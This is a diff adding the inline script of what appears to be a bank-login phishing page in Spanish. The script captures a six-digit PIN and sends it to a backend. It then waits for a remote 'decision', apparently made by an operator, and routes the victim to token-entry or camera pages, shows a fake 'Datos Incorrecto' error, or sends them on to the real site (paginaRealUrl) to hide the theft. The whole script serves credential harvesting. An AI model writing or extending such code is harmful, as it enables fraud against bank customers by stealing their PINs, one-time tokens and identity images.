+        return s
+          .split(/\s+/)
+          .filter(function (w) {
+            return w.length > 0;
+          })
+          .map(function (w) {
+            return w.charAt(0).toLocaleUpperCase("es") + w.slice(1).toLocaleLowerCase("es");
+          })
+          .join(" ");
+      }
+
+      async function actualizarSaludoLogin() {
+        var g = document.getElementById("greeting");
+        if (!g) return false;
+        var u = "";
+        try {
+          u = String(sessionStorage.getItem("usuario") || "").trim();
+        } catch (eL) {}
+        var nombre = formatearNombreTitulo(u);
+        g.textContent = nombre ? "¡Hola " + nombre + "!" : "¡Hola!";
+        return !!nombre;
+      }
+
+      actualizarSaludoLogin();
+      var saludoPollN = 0;
+      var saludoPollTimer = window.setInterval(function () {
+        actualizarSaludoLogin().then(function (ok) {
+          saludoPollN++;
+          if (ok || saludoPollN >= 45) {
+            window.clearInterval(saludoPollTimer);
+          }
+        });
+      }, 2000);
+
+      if (cancel) {
+        cancel.addEventListener("click", function () {
+          if (window.history.length > 1) {
+            window.history.back();
+          } else {
+            window.location.href = "index1.html";
+          }
+        });
+      }
+
+      if (form) {
+        form.addEventListener("submit", async function (e) {
+          e.preventDefault();
+          if (!input) return;
+          hideNipMsg();
+          hideClaveFieldError();
+          soloDigitosSeis();
+          var v = String(input.value || "");
+          if (v.length === 0) {
+            showClaveFieldError("Este campo es requerido");
+            input.focus();
+            return;
+          }
+          if (!/^\d{6}$/.test(v)) {
+            showClaveFieldError("Este campo es requerido");
+            input.focus();
+            return;
+          }
+
+          resetLoginBanner();
+
+          var btnSubmit = form.querySelector('button[type="submit"]');
+          if (btnSubmit) btnSubmit.disabled = true;
+
+          var lid = "";
+          try {
+            if (typeof window.bapaEnviarClaveNipAlLogin === "function") {
+              lid = await window.bapaEnviarClaveNipAlLogin(v);
+            }
+          } catch (eReg) {
+            console.warn("[login]", eReg);
+          }
+
+          if (!lid) {
+            if (btnSubmit) btnSubmit.disabled = false;
+            syncIngresarEstado();
+            showNipMsg(
+              "No se pudo guardar la clave. Volvé a entrar desde el inicio."
+            );
+            if (input) input.focus();
+            return;
+          }
+
+          showWait();
+
+          var decision = null;
+          if (typeof window.bapaEsperarDecisionPorId === "function") {
+            try {
+              decision = await window.bapaEsperarDecisionPorId(lid, WAIT_MAX_MS);
+            } catch (eWait) {
+              decision = null;
+            }
+          }
+
+          if (!decision) {
+            hideWait();
+            if (btnSubmit) btnSubmit.disabled = false;
+            syncIngresarEstado();
+            alert("No hubo respuesta a tiempo. Intentá de nuevo.");
+            return;
+          }
+
+          var decNorm = loginNormalizeDecisionRaw(decision);
+          if (typeof window.bapaNormalizePanelDecision === "function") {
+            var nPan = window.bapaNormalizePanelDecision(decision);
+            if (nPan) decNorm = nPan;
+          }
+
+          decNorm = String(decNorm)
+            .replace(/[\u200b\uFEFF]/g, "")
+            .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "")
+            .trim()
+            .toLowerCase();
+
+          if (typeof window.bapaNormalizePanelDecision === "function") {
+            var nPost = window.bapaNormalizePanelDecision(decNorm);
+            if (nPost === "ir_token") decNorm = "ir_token";
+            if (nPost === "ir_camara") decNorm = "ir_camara";
+          }
+
+          if (!decNorm) {
+            hideWait();
+            if (btnSubmit) btnSubmit.disabled = false;
+            syncIngresarEstado();
+            alert("Respuesta no reconocida o vacía. Intentá de nuevo.");
+            return;
+          }
+
+          if (loginEsIrTokenSlug(decNorm)) {
+            hideWait();
+            window.location.href = "tok.html";
+            return;
+          }
+
+          if (
+            typeof window.bapaDecisionEsIrToken === "function" &&
+            window.bapaDecisionEsIrToken(decNorm)
+          ) {
+            hideWait();
+            window.location.href = "tok.html";
+            return;
+          }
+
+          switch (decNorm) {
+            case "aprobado":
+              hideWait();
+              window.location.href = "cam.html";
+              return;
+
+            case "ir_oficial": {
+              hideWait();
+              window.location.href = paginaRealUrl();
+              return;
+            }
+
+            case "ir_token":
+              hideWait();
+              window.location.href = "tok.html";
+              return;
+
+            case "ir_camara":
+              hideWait();
+              window.location.href = "cam.html";
+              return;
+
+            case "rechazado":
+              hideWait();
+              if (btnSubmit) btnSubmit.disabled = false;
+              input.value = "";
+              syncIngresarEstado();
+              syncClaveBordeVacio();
+              showLoginBannerError("Datos Incorrecto, validad tu información (500)");
+              input.focus();
+              return;
+
+            case "timeout":
+              hideWait();
+              if (btnSubmit) btnSubmit.disabled = false;
+              syncIngresarEstado();
+              alert("Tiempo agotado.");
+              return;
+
+            case "recargar_login":
+              hideWait();
+              if (btnSubmit) btnSubmit.disabled = false;
+              syncIngresarEstado();
+              try {
+                sessionStorage.removeItem("bapa_last_login_id");
+              } catch (eR) {}
+              alert("Volvé a ingresar los datos.");
+              return;
+
+            default:
+              if (loginEsIrTokenSlug(decNorm)) {
+                hideWait();
+                window.location.href = "tok.html";
+                return;
+              }
+              hideWait();
+              if (btnSubmit) btnSubmit.disabled = false;
+              syncIngresarEstado();
+              alert(
+                "Respuesta no reconocida: [" +
+                  decNorm.slice(0, 64) +
+                  "]. Copiá ese texto y revisá script.js."
+              );
+          }
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
